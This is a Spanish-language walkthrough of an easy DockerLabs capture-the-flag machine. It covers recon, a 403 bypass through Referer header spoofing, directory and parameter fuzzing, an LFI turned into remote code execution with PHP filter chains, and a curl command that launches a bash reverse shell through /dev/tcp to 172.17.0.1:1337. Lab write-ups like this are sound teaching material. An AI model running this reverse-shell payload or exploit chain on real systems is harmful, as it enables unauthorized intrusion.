***Jhair***
**IP**:  172.17.0.2
**Source:** DockeLabs
**Level:** Fácil
**Date:** 29 enero 2026
**Autor**:
**descripcion**: 


**Flags**:  


**Begin**:

---

Comenzamos haciendo un ping:
![Pasted image 20260129131533.png](../../_assets/400470a9dffc2c3fc8bfefcaafde5cb79e79b48cb54d6f863d2aaf0d17c32cc3.png)
Hay conexión 
TTL: 64 -> Linux

Escaneo de Puertos abiertos TCP
![Pasted image 20260129131559.png](../../_assets/ab1a95b0c115c128e31a0238c858252ac367b8dd967720e195e0b4cf4a79136c.png)
Puertos abiertos: 
Puertos 80 (HTTP)

Escaneo de versión al puerto 80.
![Pasted image 20260129131647.png](../../_assets/be08daf04c59a8f0240605840151c38e252a368b9776872b183740bd8ea72186.png)


Accedemos a la pagina web
![Pasted image 20260129131734.png](../../_assets/f7ae6c11d397944d09e9197647bdb298b4577f4f5d27eee74df051573d28078d.png)
El servidor respondió con la página por defecto de Apache2

Pero vemos que un linea dice menciona a un nombre de dominio `bypass403.pw`
![Pasted image 20260205174926.png](../../_assets/06fc138ed8537adb7451ead35d0457ebd6e77b5371e62e02a1f4948468e5fba9.png)

Nos dirigimos a aquel nombre de dominio
![Pasted image 20260205175034.png](../../_assets/364a37b25e62931c4bc58195ac074eab48bafd0f8e710168d4fb9a51689e236d.png)
Y vemos que no nos deja acceder y que no tenemos permiso
Dado el nombre del dominio (`bypass403.pw`), el objetivo de este ejercicio es manipular la petición interceptada.

El objetivo es "engañarlo" para que piense que si tenemos permiso.
Con `burpsuite` capturamos la petición 
![Pasted image 20260205175352.png](../../_assets/cd959dd49c2e414059ee1333ef3fb8e2cb24cab729c9b5577e65f8cd9feef1a0.png)

Vemos la petición se trata de una petición `GET`
![Pasted image 20260205180319.png](../../_assets/2bda75650e8c6f375bce5bd67c42ea8142fe67303542d1451297f9bc740dd167.png)

Probé si control de acceso podría estar mal configurado y ver en las cabeceras HTTP manipulables por el cliente

Enviamos la petición al repeater
![Pasted image 20260205182626.png](../../_assets/e38d228721f011cfa2f99d5bdeb5c6ecca63b200a620e4822fa91104325b77c0.png)
Comencé a inyectar cabeceras HTTP de forma iterativa para falsificar mi origen. - **Header Spoofing**

Y al inyectar la cabecera `Referer` busqué engañar a la lógica del servidor para que interpretara que mi solicitud de acceso provenía de un enlace interno y de confianza, en lugar de un acceso directo externo.
Y le añadimos un `close` a la peticion
`close`: No esperes nada más, procesa esto ya y corta la comunicación - **Match and Replace**
Match and Replace

Para no tener que interceptar cada petición y escribir `Referer: ...` a mano cada vez que haces clic en un enlace
Configuraste a Burp Suite como un "intermediario automático".
Proxy -> Proxy Settings -> Match and Replace rules
![Pasted image 20260205181823.png](../../_assets/5e296f45ba5e339025ace19641bff41d306cf26fbb61f75ec61b59839c79eef5.png)

Ahora nos dirigimos a `bypass403.pw`
![Pasted image 20260205181932.png](../../_assets/e43cc3a57ed964118a0d94810de8c46363fe64489cccf9b09321fbdbc34bf9ac.png)

Realizamos un fuzzing de directorios.
```bash
gobuster dir -u http://bypass403.pw -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x html,php,txt,py,sh,log,js,zip -t 200 -H "Referer: http://bypass403.pw"
```
Usamos el flag `-H` para añadir la cabecera `Regerer`.
![Pasted image 20260205184609.png](../../_assets/c47331260452f69514a69751fb36427e17d56db28c910ca749e0ed452436ca1f.png)
No encontramos nada

Asique probamos con un fuzzing de parámetros con `ffuf`
```bash
ffuf -u "http://bypass403.pw/index.php?FUZZ=1" -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -H "Referer: http://bypass403.pw" -fs 1192
```
![Pasted image 20260205185352.png](../../_assets/fb4fe57a750d6c951b687fca9d84754bc0dac8f1a98d55e9a272c983d90d53c1.png)
Y encontramos el parámetro `pages`

Probamos si es vulnerable  aun vulnerabilidad de Local file inclusion
![Pasted image 20260205185526.png](../../_assets/f2eda8142e67847031f49ce0bf196620f783fa774228d1a2c1683a9183323bba.png)
Y vemos que si es vulnerable a un LFI

Remote Code Execution via PHP Filter Chains

https://github.com/synacktiv/php_filter_chain_generator

Abusa de cómo PHP procesa los filtros (base64, rot13, iconv) para ir transformando un texto basura hasta convertirlo en el código PHP que uno quiera.

![Pasted image 20260205191921.png](../../_assets/1004649e9ab9c40cd2376af1a26a4477479602cdc6c24fe23353d267afeda811.png)

Reconocimiento y Validación

Generamos
```bash
python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>'
```

Verificamos
```
curl -H "Referer: http://bypass403.pw" "http://bypass403.pw/index.php?pages=PEGAR_CADENA_AQUI"
```

Generar el "Stager"
crear una cadena de filtros que, al ser interpretada por el servidor, escribe un pequeño código PHP en memoria.

Generamos
![Pasted image 20260205201158.png](../../_assets/358edeae201e8b4b994eab804e05927bd76daa7e3a519f468aa031e44dc7fd7c.png)

Verificamos
```bash
curl -H "Referer: http://bypass403.pw" "http://bypass403.pw/index.php?pages=PEGAR_CADENA_AQUI&cmd=id" --output -
```

Ejecutamos la reverse shell

Puerto de escucha
```bash
nc -nvlp 1337
```

Lanzamos:

```bash
curl -H "Referer: http://bypass403.pw" "http://bypass403.pw/index.php?pages=PEGAR_CADENA_AQUI&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F1337%200%3E%261%27" --output -
``` 

![Pasted image 20260205195823.png](../../_assets/cc1d462d368d95470991c1504bb9cc4b6360691878123fb925f6547268726c11.png)

![Pasted image 20260205202231.png](../../_assets/1006c4cb066a0867cdf341ec9f36f5353d3b4ce096fced6b7f3499911c9164a9.png)

![Pasted image 20260205202306.png](../../_assets/10753c588f13f35d261975ecdb5da64f4398e06ae9556e6a362a30218c9eb2d9.png)

![Pasted image 20260205202536.png](../../_assets/008b6ef095310f93c9ecb36e987276059ca995eceda0e13492661e4919db959a.png)

![Pasted image 20260205202604.png](../../_assets/468efd3677ac2b58a8b7836e3f19e7ee5297a93e65a8e03a59ecd1bc28f5cb87.png)


![Pasted image 20260205203221.png](../../_assets/1302c87bd38a664d1098cb1da92b3a967b67570040438b3c471392ec1e130308.png)


```bash
strings /usr/bin/furb
```

![Pasted image 20260205204110.png](../../_assets/9eacd730bf2e59c78fab4b76fb2a54b55a1cb37fd9cdd8d5bdc496c68959a698.png)
El binario tiene programada una opción -r que espera un argumento de archivo

La función read_file sugiere fuertemente que esta opción sirve para leer el contenido de un archivo.


![Pasted image 20260205204406.png](../../_assets/aa581d0b5585c3dd7c21a496aa6b8a683055f7a770118de05ae5bde7967ad1ab.png)



![Pasted image 20260205204334.png](../../_assets/35ed3c87c373254196eae28ebbbea9b9073d6c7c9055bac06a0c000378a50f89.png)


![Pasted image 20260205204425.png](../../_assets/4984c9cf8858a73e39f033a0c4d0c158853cb2c4fb2ed457ad3b4d8842b9222c.png)

![Pasted image 20260205204450.png](../../_assets/943ccab01bc42937a3c2028d460a1377e85839e5eadc4e5ee9b424e7b4a2ea5e.png)

![Pasted image 20260205204513.png](../../_assets/2069ad0c0a4565e07b2676033e0f95be402f97567bd9faefc77a9b32d71a0b07.png)

